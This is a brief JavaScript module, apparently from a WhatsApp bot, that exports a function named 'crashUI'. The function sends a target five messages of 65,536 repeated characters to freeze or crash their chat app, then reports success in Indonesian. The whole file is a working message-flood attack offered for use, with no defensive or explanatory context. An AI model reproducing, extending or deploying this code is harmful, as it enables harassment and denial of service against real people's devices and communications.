async function crashUI(sock, target) {
    const longText = 'A'.repeat(65536);
    for (let i = 0; i < 5; i++) {
        await sock.sendMessage(target, { text: longText });
    }
    return '✅ CrashUI dikirim';
}
module.exports = crashUI
